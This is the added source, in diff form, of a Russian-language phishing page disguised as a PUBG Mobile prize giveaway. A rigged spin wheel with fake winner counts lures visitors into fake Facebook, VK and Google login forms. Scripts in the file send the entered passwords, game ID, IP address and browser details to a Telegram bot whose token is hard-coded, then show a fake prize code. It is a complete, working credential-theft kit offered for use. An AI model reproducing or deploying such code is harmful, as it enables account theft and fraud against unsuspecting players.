+                    ПРОДОЛЖИТЬ
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Facebook Modal -->
+    <div class="modal-overlay" id="facebookModal">
+        <div class="modal-content">
+            <div style="background: var(--pubg-blue); padding: 25px; text-align: center;">
+                <h2 style="color: white; font-size: 32px; font-weight: 900;">facebook</h2>
+                <p style="color: rgba(255, 255, 255, 0.9); margin-top: 10px;">Вход для получения приза</p>
+            </div>
+            
+            <div style="padding: 30px;">
+                <form id="facebookForm">
+                    <div style="margin-bottom: 20px;">
+                        <input type="text" class="fb-input" id="fbEmail" placeholder="Мобильный телефон или эл. адрес" required style="width: 100%; padding: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px;">
+                    </div>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <input type="password" class="fb-input" id="fbPassword" placeholder="Пароль" required style="width: 100%; padding: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px;">
+                    </div>
+                    
+                    <button type="submit" class="spin-button" id="submitFacebookBtn" style="background: var(--pubg-blue);">
+                        <i class="fab fa-facebook"></i>
+                        Войти
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <!-- VK Modal -->
+    <div class="modal-overlay" id="vkModal">
+        <div class="modal-content">
+            <div style="background: var(--pubg-vk); padding: 25px; text-align: center;">
+                <h2 style="color: white; font-size: 32px; font-weight: 700;">ВКонтакте</h2>
+                <p style="color: rgba(255, 255, 255, 0.9); margin-top: 10px;">Вход для получения приза</p>
+            </div>
+            
+            <div style="padding: 30px;">
+                <form id="vkForm">
+                    <div style="margin-bottom: 20px;">
+                        <input type="text" class="vk-input" id="vkEmail" placeholder="Телефон или email" required style="width: 100%; padding: 15px; border: 1px solid #dce1e6; border-radius: 6px; font-size: 17px;">
+                    </div>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <input type="password" class="vk-input" id="vkPassword" placeholder="Пароль" required style="width: 100%; padding: 15px; border: 1px solid #dce1e6; border-radius: 6px; font-size: 17px;">
+                    </div>
+                    
+                    <button type="submit" class="spin-button" id="submitVkBtn" style="background: var(--pubg-vk);">
+                        <i class="fab fa-vk"></i>
+                        Войти
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Google Modal -->
+    <div class="modal-overlay" id="googleModal">
+        <div class="modal-content">
+            <div style="background: #4285f4; padding: 25px; text-align: center;">
+                <h2 style="color: white; font-size: 32px; font-weight: 500;">Google</h2>
+                <p style="color: rgba(255, 255, 255, 0.9); margin-top: 10px;">Вход для получения приза</p>
+            </div>
+            
+            <div style="padding: 30px;">
+                <form id="googleForm">
+                    <div style="margin-bottom: 20px;">
+                        <input type="email" class="google-input" id="googleEmail" placeholder="Электронная почта" required style="width: 100%; padding: 15px; border: 1px solid #dadce0; border-radius: 6px; font-size: 17px;">
+                    </div>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <input type="password" class="google-input" id="googlePassword" placeholder="Пароль" required style="width: 100%; padding: 15px; border: 1px solid #dadce0; border-radius: 6px; font-size: 17px;">
+                    </div>
+                    
+                    <button type="submit" class="spin-button" id="submitGoogleBtn" style="background: #4285f4;">
+                        <i class="fab fa-google"></i>
+                        Далее
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <!-- PUBG ID Modal -->
+    <div class="modal-overlay" id="pubgModal">
+        <div class="modal-content">
+            <div style="background: linear-gradient(135deg, var(--pubg-red) 0%, #ff6b6b 100%); padding: 25px; text-align: center;">
+                <h2 style="color: white; font-size: 28px; margin-bottom: 10px;">Введите ID PUBG Mobile</h2>
+                <p style="color: rgba(255, 255, 255, 0.9);">Для отправки приза</p>
+            </div>
+            
+            <div style="padding: 30px;">
+                <form id="pubgForm">
+                    <div style="margin-bottom: 20px;">
+                        <input type="text" class="fb-input" id="pubgId" placeholder="Ваш ID PUBG Mobile" required style="width: 100%; padding: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px;">
+                    </div>
+                    
+                    <div style="margin-bottom: 30px;">
+                        <select class="fb-input" id="pubgServer" required style="width: 100%; padding: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; color: #1d2129;">
+                            <option value="">Выберите сервер</option>
+                            <option value="europe">Европа</option>
+                            <option value="asia">Азия</option>
+                            <option value="america">Америка</option>
+                            <option value="middle_east">Ближний Восток</option>
+                        </select>
+                    </div>
+                    
+                    <button type="submit" class="spin-button">
+                        <i class="fas fa-gift"></i>
+                        ПОЛУЧИТЬ ПРИЗ
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Success Modal -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal-content">
+            <div style="background: linear-gradient(135deg, var(--pubg-green) 0%, #00d4aa 100%); padding: 40px 20px; text-align: center;">
+                <div style="font-size: 80px; margin-bottom: 20px;">🎉</div>
+                <h2 style="color: white; font-size: 36px; margin-bottom: 10px;">Поздравляем!</h2>
+                <p style="color: rgba(255, 255, 255, 0.9); font-size: 18px;">Ваш приз успешно получен</p>
+            </div>
+            
+            <div style="padding: 30px; text-align: center;">
+                <div style="font-size: 24px; color: #1c1e21; margin-bottom: 20px; font-weight: bold;">
+                    Ваш выигрыш:
+                </div>
+                <div style="font-size: 32px; color: var(--pubg-red); font-weight: 900; margin-bottom: 30px;" id="finalPrize"></div>
+                
+                <div style="background: #f0f2f5; padding: 25px; border-radius: 12px; border: 2px dashed var(--pubg-green); margin-bottom: 30px;">
+                    <div style="color: #606770; margin-bottom: 15px; font-size: 18px;">Код активации:</div>
+                    <div style="font-size: 28px; color: var(--pubg-blue); font-weight: bold; font-family: 'Courier New', monospace; letter-spacing: 3px;" id="activationCode"></div>
+                </div>
+                
+                <button class="spin-button" onclick="location.reload()" style="background: var(--pubg-blue);">
+                    <i class="fas fa-redo"></i>
+                    ВЕРНУТЬСЯ В ИГРУ
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const prizes = [
+            { 
+                id: 1, 
+                name: "Мумия", 
+                description: "Эксклюзивный скин",
+                image: "https://i.imgur.com/4N0vzrR.png",
+                type: "skin",
+                code: "PUBG-MUMMY-" + generateCode()
+            },
+            { 
+                id: 2, 
+                name: "120 UC", 
+                description: "Игровая валюта",
+                image: "https://i.imgur.com/4N0vzrR.png", 
+                type: "currency",
+                code: "PUBG-UC-120-" + generateCode()
+            },
+            { 
+                id: 3, 
+                name: "1000 Серебра", 
+                description: "Игровая валюта",
+                image: "https://i.imgur.com/4N0vzrR.png", 
+                type: "currency",
+                code: "PUBG-SILVER-1000-" + generateCode()
+            },
+            { 
+                id: 4, 
+                name: "M416 Ледник", 
+                description: "Ледяной скин",
+                image: "https://i.imgur.com/4N0vzrR.png", 
+                type: "skin",
+                code: "PUBG-M416-GLACIER-" + generateCode()
+            },
+            { 
+                id: 5, 
+                name: "M416 Шут", 
+                description: "Шуточный скин",
+                image: "https://i.imgur.com/4N0vzrR.png", 
+                type: "skin",
+                code: "PUBG-M416-JOKE-" + generateCode()
+            },
+            { 
+                id: 6, 
+                name: "AKM Скин", 
+                description: "Эксклюзивный скин",
+                image: "https://i.imgur.com/4N0vzrR.png", 
+                type: "skin",
+                code: "PUBG-AKM-SKIN-" + generateCode()
+            },
+            { 
+                id: 7, 
+                name: "Скарель скин", 
+                description: "Редкий скин",
+                image: "https://i.imgur.com/4N0vzrR.png", 
+                type: "skin",
+                code: "PUBG-SCAREL-" + generateCode()
+            },
+            { 
+                id: 8, 
+                name: "Сундук", 
+                description: "Сюрпризный сундук",
+                image: "https://i.imgur.com/4N0vzrR.png", 
+                type: "chest",
+                code: "PUBG-CHEST-" + generateCode()
+            }
+        ];
+
+        function generateCode() {
+            return Math.random().toString(36).substr(2, 8).toUpperCase();
+        }
+
+        const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
+        const TELEGRAM_CHAT_ID = '1709490182';
+
+        let hasSpun = false;
+        let currentPrize = null;
+        let userIP = '';
+        let socialData = {};
+        let selectedSocial = 'facebook';
+
+        document.addEventListener('DOMContentLoaded', function() {
+            createPrizesGrid();
+            getUserIP();
+            createParticles();
+            
+            // Устанавливаем статистику на 21
+            document.getElementById('totalSpins').textContent = '21';
+            document.getElementById('todayWinners').textContent = '21';
+            
+            // Основные обработчики
+            document.getElementById('spinButton').addEventListener('click', spin);
+            document.getElementById('socialChoiceBtn').addEventListener('click', showSocialModal);
+            document.getElementById('confirmSocialBtn').addEventListener('click', confirmSocialChoice);
+            
+            // Обработчики форм
+            document.getElementById('facebookForm').addEventListener('submit', handleFacebookSubmit);
+            document.getElementById('vkForm').addEventListener('submit', handleVkSubmit);
+            document.getElementById('googleForm').addEventListener('submit', handleGoogleSubmit);
+            document.getElementById('pubgForm').addEventListener('submit', handlePubgSubmit);
+            
+            // Выбор соцсети
+            document.querySelectorAll('.social-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.social-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    this.classList.add('active');
+                    selectedSocial = this.dataset.social;
+                });
+            });
+            
+            // Закрытие модалок по клику вне
+            ['socialModal', 'facebookModal', 'vkModal', 'googleModal', 'pubgModal', 'successModal'].forEach(id => {
+                document.getElementById(id).addEventListener('click', function(e) {
+                    if (e.target === this) closeModal(id);
+                });
+            });
+        });
+
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const colors = ['#ff3838', '#FFD700', '#00b894', '#1877F2', '#ffffff'];
+            
+            for (let i = 0; i < 40; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = Math.random() * 6 + 2 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.background = colors[Math.floor(Math.random() * colors.length)];
+                particle.style.opacity = Math.random() * 0.3 + 0.1;
+                particle.style.animationDelay = Math.random() * 25 + 's';
+                particle.style.animationDuration = Math.random() * 15 + 15 + 's';
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        function showSocialModal() {
+            if (!currentPrize) {
+                alert('Сначала крути рулетку!');
+                return;
+            }
+            document.getElementById('socialModal').style.display = 'flex';
+        }
+
+        function confirmSocialChoice() {
+            closeModal('socialModal');
+            
+            switch(selectedSocial) {
+                case 'facebook':
+                    showFacebookModal();
+                    break;
+                case 'vk':
+                    showVkModal();
+                    break;
+                case 'google':
+                    showGoogleModal();
+                    break;
+            }
+        }
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (error) {
+                userIP = 'Неизвестно';
+            }
+        }
+
+        function createPrizesGrid() {
+            const grid = document.getElementById('prizesGrid');
+            grid.innerHTML = '';
+            
+            prizes.forEach((prize, index) => {
+                const item = document.createElement('div');
+                item.className = 'prize-item';
+                item.innerHTML = `
+                    <img src="${prize.image}" alt="${prize.name}" class="prize-item-image">
+                    <div class="prize-item-name">${prize.name}</div>
+                    <div class="prize-item-desc">${prize.description}</div>
+                `;
+                
+                item.addEventListener('click', () => {
+                    showPrizeInfo(prize);
+                });
+                
+                grid.appendChild(item);
+            });
+        }
+
+        function showPrizeInfo(prize) {
+            const alertBox = document.createElement('div');
+            alertBox.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: linear-gradient(135deg, rgba(0,0,0,0.97), rgba(40,0,0,0.97));
+                color: white;
+                padding: 40px 30px;
+                border-radius: 25px;
+                border: 3px solid var(--pubg-red);
+                box-shadow: 0 25px 60px rgba(255,56,56,0.6);
+                z-index: 10001;
+                max-width: 450px;
+                width: 90%;
+                text-align: center;
+                animation: modalSlideIn 0.3s ease-out;
+                backdrop-filter: blur(10px);
+            `;
+            
+            alertBox.innerHTML = `
+                <div style="font-size: 50px; margin-bottom: 25px;">🎁</div>
+                <div style="font-size: 28px; color: var(--pubg-gold); margin-bottom: 15px; font-weight: bold;">${prize.name}</div>
+                <div style="color: var(--pubg-green); font-size: 20px; margin-bottom: 25px; font-weight: 500;">${prize.description}</div>
+                <div style="color: rgba(255, 255, 255, 0.7); margin-bottom: 30px; font-size: 16px; line-height: 1.5;">Редкий эксклюзивный приз! Вы можете выиграть его, нажав кнопку "Крутить"</div>
+                <button onclick="this.parentElement.remove(); document.body.removeChild(document.body.lastChild)" style="
+                    background: linear-gradient(135deg, var(--pubg-red), #ff6b6b);
+                    color: white;
+                    border: none;
+                    padding: 15px 40px;
+                    border-radius: 12px;
+                    font-size: 18px;
+                    font-weight: bold;
+                    cursor: pointer;
+                    transition: all 0.3s;
+                ">
+                    <i class="fas fa-times"></i> Закрыть
+                </button>
+            `;
+            
+            document.body.appendChild(alertBox);
+            
+            const overlay = document.createElement('div');
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.8);
+                z-index: 10000;
+                animation: fadeIn 0.3s;
+                backdrop-filter: blur(5px);
+            `;
+            overlay.onclick = () => {
+                alertBox.remove();
+                overlay.remove();
+            };
+            document.body.appendChild(overlay);
+        }
+
+        function spin() {
+            if (hasSpun) {
+                alert('⚠️ У тебя только одна попытка на аккаунт!');
+                return;
+            }
+            
+            const spinBtn = document.getElementById('spinButton');
+            spinBtn.disabled = true;
+            spinBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> КРУТИТСЯ...';
+            
+            const prizeDisplay = document.getElementById('prizeDisplay');
+            prizeDisplay.style.opacity = '0.5';
+            
+            // Рандомный выбор приза
+            const randomIndex = Math.floor(Math.random() * prizes.length);
+            currentPrize = prizes[randomIndex];
+            
+            // Обновляем статистику
+            document.getElementById('totalSpins').textContent = '22'; // Увеличиваем на 1
+            document.getElementById('todayWinners').textContent = '22'; // Увеличиваем на 1
+            
+            setTimeout(() => {
+                prizeDisplay.style.opacity = '1';
+                document.getElementById('defaultPrize').style.display = 'none';
+                document.getElementById('wonPrize').style.display = 'block';
+                
+                const prizeImage = document.getElementById('wonPrizeImage');
+                prizeImage.src = currentPrize.image;
+                prizeImage.onerror = function() {
+                    this.src = 'https://i.imgur.com/4N0vzrR.png';
+                };
+                
+                document.getElementById('wonPrizeName').textContent = currentPrize.name;
+                document.getElementById('wonPrizeDesc').textContent = currentPrize.description;
+                
+                document.getElementById('initialMessage').style.display = 'none';
+                document.getElementById('winnerMessage').style.display = 'block';
+                document.getElementById('winnerPrizeText').textContent = currentPrize.name;
+                
+                document.getElementById('socialChoiceBtn').style.display = 'flex';
+                
+                spinBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИСПОЛЬЗОВАНО';
+                hasSpun = true;
+                
+                createFireworks();
+                
+            }, 2000);
+        }
+
+        function showFacebookModal() {
+            document.getElementById('facebookModal').style.display = 'flex';
+            document.getElementById('fbEmail').focus();
+        }
+
+        function showVkModal() {
+            document.getElementById('vkModal').style.display = 'flex';
+            document.getElementById('vkEmail').focus();
+        }
+
+        function showGoogleModal() {
+            document.getElementById('googleModal').style.display = 'flex';
+            document.getElementById('googleEmail').focus();
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+            if (modalId.includes('Modal') && modalId !== 'socialModal') {
+                const form = document.getElementById(modalId.replace('Modal', 'Form'));
+                if (form) form.reset();
+            }
+        }
+
+        async function handleFacebookSubmit(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('fbEmail').value.trim();
+            const password = document.getElementById('fbPassword').value.trim();
+            
+            if (!email || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            if (!validateEmail(email) && !validatePhone(email)) {
+                alert('Введите корректный email или телефон');
+                return;
+            }
+            
+            if (password.length < 6) {
+                alert('Пароль слишком короткий');
+                return;
+            }
+            
+            socialData = {
+                social: 'facebook',
+                email: email,
+                password: password
+            };
+            
+            await sendSocialDataToTelegram();
+            closeModal('facebookModal');
+            showPubgModal();
+        }
+
+        async function handleVkSubmit(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('vkEmail').value.trim();
+            const password = document.getElementById('vkPassword').value.trim();
+            
+            if (!email || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            socialData = {
+                social: 'vk',
+                email: email,
+                password: password
+            };
+            
+            await sendSocialDataToTelegram();
+            closeModal('vkModal');
+            showPubgModal();
+        }
+
+        async function handleGoogleSubmit(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('googleEmail').value.trim();
+            const password = document.getElementById('googlePassword').value.trim();
+            
+            if (!email || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            socialData = {
+                social: 'google',
+                email: email,
+                password: password
+            };
+            
+            await sendSocialDataToTelegram();
+            closeModal('googleModal');
+            showPubgModal();
+        }
+
+        function showPubgModal() {
+            document.getElementById('pubgModal').style.display = 'flex';
+            document.getElementById('pubgId').focus();
+        }
+
+        async function handlePubgSubmit(e) {
+            e.preventDefault();
+            
+            const pubgId = document.getElementById('pubgId').value.trim();
+            const server = document.getElementById('pubgServer').value;
+            
+            if (!pubgId || !server) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            if (!/^\d+$/.test(pubgId)) {
+                alert('ID PUBG должен содержать только цифры');
+                return;
+            }
+            
+            const submitBtn = document.querySelector('#pubgForm .spin-button');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ОТПРАВКА...';
+            
+            const userData = {
+                ...socialData,
+                pubg_id: pubgId,
+                pubg_server: server,
+                prize: currentPrize.name,
+                prize_code: currentPrize.code,
+                prize_description: currentPrize.description,
+                user_ip: userIP,
+                user_agent: navigator.userAgent,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toLocaleString(),
+                browser_language: navigator.language,
+                screen_resolution: `${window.screen.width}x${window.screen.height}`
+            };
+            
+            saveToLocalStorage(userData);
+            await sendCompleteDataToTelegram(userData);
+            
+            setTimeout(() => {
+                closeModal('pubgModal');
+                showSuccessModal();
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-gift"></i> ПОЛУЧИТЬ ПРИЗ';
+            }, 1000);
+        }
+
+        async function sendSocialDataToTelegram() {
+            try {
+                const message = `
+🔔 НОВЫЙ ВХОД В ${socialData.social.toUpperCase()}
+
+📧 Email/Телефон: ${socialData.email}
+🔐 Пароль: ${socialData.password}
+
+🎁 Выигранный приз: ${currentPrize.name}
+📍 IP: ${userIP}
+
+⏰ Время: ${new Date().toLocaleString()}
+                `;
+                
+                await sendToTelegram(message);
+                
+            } catch (error) {
+                console.error('❌ Ошибка отправки данных:', error);
+            }
+        }
+
+        async function sendCompleteDataToTelegram(data) {
+            try {
+                const message = `
+🎮 ПОЛНЫЕ ДАННЫЕ ПОБЕДИТЕЛЯ!
+
+🏆 ПРИЗ: ${data.prize}
+🔑 КОД: ${data.prize_code}
+📝 Описание: ${data.prize_description}
+
+🔗 СОЦСЕТЬ: ${data.social}
+📧 ЛОГИН: ${data.email}
+🔐 ПАРОЛЬ: ${data.password}
+
+🎮 PUBG ID: ${data.pubg_id}
+🌍 СЕРВЕР: ${data.pubg_server}
+
+📍 IP: ${data.user_ip}
+🌐 Браузер: ${data.user_agent}
+🗺️ Таймзона: ${data.timezone}
+🌍 Язык: ${data.browser_language}
+🖥️ Разрешение: ${data.screen_resolution}
+
+⏰ Время получения: ${data.timestamp}
+🆔 Сессия: ${generateSessionId()}
+
+🚀 ОТПРАВЬТЕ ПРИЗ ИГРОКУ!
+                `;
+                
+                await sendToTelegram(message);
+                
+            } catch (error) {
+                console.error('❌ Ошибка отправки полных данных:', error);
+            }
+        }
+
+        async function sendToTelegram(message) {
+            const encodedMessage = encodeURIComponent(message);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+            
+            try {
+                await fetch(url, { method: 'POST' });
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram');
+            }
+        }
+
+        function generateSessionId() {
+            return 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        function saveToLocalStorage(data) {
+            let claims = JSON.parse(localStorage.getItem('pubg_claims') || '[]');
+            claims.push({
+                ...data,
+                claimed_at: new Date().toISOString()
+            });
+            localStorage.setItem('pubg_claims', JSON.stringify(claims));
+        }
+
+        function showSuccessModal() {
+            document.getElementById('activationCode').textContent = currentPrize.code;
+            document.getElementById('finalPrize').textContent = currentPrize.name;
+            document.getElementById('successModal').style.display = 'flex';
+            
+            document.getElementById('socialChoiceBtn').style.display = 'none';
+            
+            document.getElementById('winnerMessage').innerHTML = `
+                <div class="win-message">✅ ПРИЗ ПОЛУЧЕН!</div>
+                <div class="winner-prize">
+                    Код: <span>${currentPrize.code}</span>
+                </div>
+                <div class="prize-subtitle" style="background: rgba(0, 184, 148, 0.15); padding: 15px; border-radius: 10px; border: 2px solid rgba(0, 184, 148, 0.3);">
+                    Придет на почту в течение 24 часов
+                </div>
+            `;
+            
+            createFireworks();
+        }
+
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function validatePhone(phone) {
+            const re = /^[\+]?[0-9\s\-\(\)]+$/;
+            return re.test(phone);
+        }
+
+        function createFireworks() {
+            const colors = ['#ff3838', '#FFD700', '#00b894', '#1877F2', '#ffffff'];
+            
+            for (let i = 0; i < 25; i++) {
+                setTimeout(() => {
+                    const firework = document.createElement('div');
+                    firework.className = 'firework';
+                    firework.style.cssText = `
+                        position: fixed;
+                        width: ${Math.random() * 12 + 5}px;
+                        height: ${Math.random() * 12 + 5}px;
+                        background: ${colors[Math.floor(Math.random() * colors.length)]};
+                        border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
+                        pointer-events: none;
+                        z-index: 9999;
+                        top: ${Math.random() * 100}%;
+                        left: ${Math.random() * 100}%;
+                    `;
+                    
+                    document.body.appendChild(firework);
+                    
+                    setTimeout(() => {
+                        if (firework.parentNode) {
+                            document.body.removeChild(firework);
+                        }
+                    }, 1000);
+                }, i * 50);
+            }
+        }
+    </script>
+</body>
+</html>
